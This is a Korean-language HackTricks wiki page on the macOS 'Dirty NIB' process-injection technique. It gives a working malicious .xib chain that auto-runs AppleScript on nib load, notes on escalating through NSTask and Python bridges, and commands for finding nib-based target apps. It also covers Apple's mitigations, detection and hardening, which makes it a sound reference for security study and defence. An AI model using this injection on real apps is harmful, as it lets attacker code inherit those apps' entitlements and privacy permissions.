# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB는 서명된 macOS 앱 bundle 내부의 Interface Builder 파일(.xib/.nib)을 악용하여 대상 process 내부에서 attacker-controlled logic을 실행하고, 이를 통해 해당 process의 entitlements 및 TCC permissions을 상속하는 기법입니다. 이 기법은 처음 xpn (MDSec)이 문서화했으며, 이후 Sector7이 이를 일반화하고 크게 확장했습니다. Sector7은 macOS 13 Ventura 및 macOS 14 Sonoma에서 Apple이 적용한 mitigations도 다루었습니다.<sup>[[1]](#references)[[2]](#references)</sup> 배경과 심층적인 내용은 마지막의 references를 참조하세요.

> TL;DR
> • macOS 13 Ventura 이전: bundle의 MainMenu.nib(또는 startup 시 로드되는 다른 nib)를 교체하면 process injection 및 종종 privilege escalation을 안정적으로 수행할 수 있었습니다.
> • macOS 13(Ventura) 이후 및 macOS 14(Sonoma)에서 개선됨: first-launch deep verification, bundle protection, Launch Constraints, 그리고 새로운 TCC “App Management” permission으로 인해 관련 없는 앱이 launch 이후 nib를 변조하는 행위가 대부분 방지됩니다. 그러나 제한적인 상황에서는 여전히 공격이 가능할 수 있습니다(예: same-developer tooling이 자체 앱을 수정하는 경우 또는 사용자가 App Management/Full Disk Access를 부여한 terminals).

## NIB/XIB files란

Nib(NeXT Interface Builder의 약어) files는 AppKit apps에서 사용하는 serialized UI object graphs입니다. 최신 Xcode는 편집 가능한 XML .xib files를 저장하며, build 시점에 이를 .nib로 compile합니다. 일반적인 앱은 `NSApplicationMain()`을 통해 main UI를 로드합니다. 이 함수는 앱의 Info.plist에서 `NSMainNibFile` key를 읽고 runtime에 object graph를 instantiate합니다.

공격을 가능하게 하는 핵심 사항:
- NIB loading은 arbitrary Objective-C classes를 instantiate하며, 해당 class가 NSSecureCoding을 준수할 필요가 없습니다(Apple의 nib loader는 `initWithCoder:`를 사용할 수 없을 때 `init`/`initWithFrame:`으로 fallback합니다).
- Cocoa Bindings를 악용하면 nib가 instantiate되는 동안 methods를 호출할 수 있으며, user interaction이 필요하지 않은 chained calls도 포함할 수 있습니다.


## Dirty NIB injection process (attacker view)

전형적인 pre-Ventura flow:
1) malicious .xib 생성
- `NSAppleScript` object(또는 `NSTask`와 같은 다른 “gadget” classes)를 추가합니다.
- payload(예: AppleScript 또는 command arguments)가 title에 포함된 `NSTextField`를 추가합니다.
- bindings를 통해 target object의 methods를 호출하도록 연결된 하나 이상의 `NSMenuItem` objects를 추가합니다.

2) user clicks 없이 auto-trigger
- bindings를 사용하여 menu item의 target/selector를 설정한 다음 private `_corePerformAction` method를 invoke하여 nib가 로드될 때 action이 자동으로 실행되도록 합니다. 이를 통해 user가 button을 click할 필요가 없어집니다.

.xib 내부의 auto-trigger chain에 대한 최소 예시(명확성을 위해 축약됨):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
이는 nib 로드 시 대상 프로세스에서 임의의 AppleScript 실행을 가능하게 합니다.<sup>[[1]](#references)</sup> Advanced chain은 다음을 수행할 수 있습니다:
- 임의의 AppKit 클래스를 인스턴스화하고(예: `NSTask`) `-launch`와 같은 인자 없는 메서드를 호출합니다.
- 위의 binding trick을 통해 object 인자를 사용하여 임의의 selector를 호출합니다.
- AppleScriptObjC.framework를 로드하여 Objective-C로 bridge하고, 선택된 C API까지 호출합니다.
- Python.framework가 여전히 포함된 구형 시스템에서는 Python으로 bridge한 다음 `ctypes`를 사용하여 임의의 C 함수를 호출합니다(Sector7의 research).<sup>[[2]](#references)</sup>

3) 앱의 nib 교체
- target.app을 쓰기 가능한 위치에 복사하고, 예를 들어 `Contents/Resources/MainMenu.nib`를 malicious nib로 교체한 후 target.app을 실행합니다. Ventura 이전에는 최초 한 번 Gatekeeper assessment가 수행된 뒤, subsequent launch에서는 shallow signature check만 수행했으므로 `.nib`와 같은 non-executable resource는 다시 검증되지 않았습니다.

visible test를 위한 AppleScript payload 예시:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## 최신 macOS 보호 기능(Ventura/Monterey/Sonoma/Sequoia)

Apple은 최신 macOS에서 Dirty NIB의 활용 가능성을 크게 낮추는 여러 시스템 수준의 완화 기능을 도입했습니다:<sup>[[2]](#references)</sup>
- First-launch deep verification 및 bundle protection(macOS 13 Ventura)
- 모든 앱이 처음 실행될 때(quarantined 여부와 관계없이) deep signature check가 모든 bundle resource를 검사합니다. 이후 해당 bundle은 보호 상태가 되며, 동일한 developer의 앱(또는 앱이 명시적으로 허용한 앱)만 해당 내용을 수정할 수 있습니다. 다른 앱이 다른 앱의 bundle에 쓰려면 새로운 TCC “App Management” permission이 필요합니다.
- Launch Constraints(macOS 13 Ventura)
- System/Apple-bundled apps는 다른 위치로 복사한 뒤 실행할 수 없습니다. 따라서 OS apps에 대해 “/tmp로 복사하고, patch한 뒤 실행”하는 방식은 더 이상 사용할 수 없습니다.
- macOS 14 Sonoma의 개선 사항
- Apple은 App Management를 강화하고 Sector7이 언급한 알려진 bypasses(예: CVE‑2023‑40450)를 수정했습니다. Python.framework는 이전에(macOS 12.3) 제거되어 일부 privilege-escalation chains가 작동하지 않게 되었습니다.
- Gatekeeper/Quarantine 변경 사항
- 이 technique에 영향을 준 Gatekeeper, provenance 및 assessment 변경 사항에 대한 자세한 내용은 아래에 참조된 페이지를 확인하세요.

> Practical implication
> • Ventura+에서는 일반적으로 process에 App Management가 없거나 target과 동일한 Team ID로 signed되지 않은 경우 third-party app의 .nib를 수정할 수 없습니다(예: developer tooling).
> • shells/terminals에 App Management 또는 Full Disk Access를 부여하면 해당 terminal의 context 안에서 code를 실행할 수 있는 모든 대상에 대해 이 attack surface가 사실상 다시 열립니다.


### Launch Constraints 대응

Launch Constraints는 Ventura부터 많은 Apple apps를 기본 위치가 아닌 곳에서 실행하지 못하도록 차단합니다. Apple app을 temp directory로 복사하고, `MainMenu.nib`를 수정한 뒤 실행하는 등 Ventura 이전 workflow에 의존하고 있었다면 >= 13.0에서 실패할 것으로 예상해야 합니다.


## targets 및 nib 열거(연구 / legacy systems에 유용)

- UI가 nib 기반인 앱 찾기:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- 번들 내부에서 후보 nib 리소스 찾기:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- 코드 서명을 철저히 검증합니다(리소스를 변조한 후 다시 서명하지 않았다면 실패합니다):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> 참고: 최신 macOS에서는 적절한 authorization 없이 다른 앱의 bundle에 쓰려고 하면 bundle protection/TCC에 의해 차단됩니다.


## Detection 및 DFIR 팁

- bundle resources의 File integrity monitoring
- 설치된 앱의 `Contents/Resources/*.nib` 및 기타 non-executable resources에 대한 mtime/ctime 변경을 감시합니다.
- Unified logs 및 process behavior
- GUI 앱 내부에서 예상치 못한 AppleScript 실행과 AppleScriptObjC 또는 Python.framework를 로드하는 process를 모니터링합니다. 예:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Proactive assessments
- resources가 정상적으로 유지되는지 확인하기 위해 중요한 앱 전체에서 주기적으로 `codesign --verify --deep`를 실행합니다.
- Privilege context
- TCC의 “App Management” 또는 Full Disk Access 권한을 가진 주체와 대상을 감사합니다(특히 terminal 및 management agent). 범용 shell에서 이러한 권한을 제거하면 Dirty NIB 스타일의 tampering을 손쉽게 다시 활성화하는 것을 방지할 수 있습니다.


## Defensive hardening (developers 및 defenders)

- Programmatic UI를 우선 사용하거나 nib에서 instantiate되는 항목을 제한합니다. 강력한 class(예: `NSTask`)를 nib graph에 포함하지 말고, 임의의 object에서 selector를 간접적으로 호출하는 binding을 피합니다.
- Library Validation이 적용된 hardened runtime을 채택합니다(최신 앱에서는 이미 표준). 이것만으로 nib injection을 차단할 수는 없지만, 손쉬운 native code loading을 차단하고 attackers를 scripting-only payload로 제한합니다.
- 범용 tool에서 광범위한 App Management 권한을 요청하거나 이에 의존하지 않습니다. MDM에 App Management가 필요한 경우 해당 context를 user-driven shell과 분리합니다.
- 앱 bundle의 integrity를 정기적으로 확인하고 update mechanism이 bundle resources를 자동으로 복구하도록 합니다.


## HackTricks의 관련 문서

이 technique에 영향을 주는 Gatekeeper, quarantine 및 provenance 변경 사항에 대해 자세히 알아보세요:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## References

- [1] [xpn – DirtyNIB (Pages 예제가 포함된 original write-up)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Bringing process injection into view(s): nib files를 악용해 모든 macOS 앱 exploit하기 (2024년 4월 5일)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
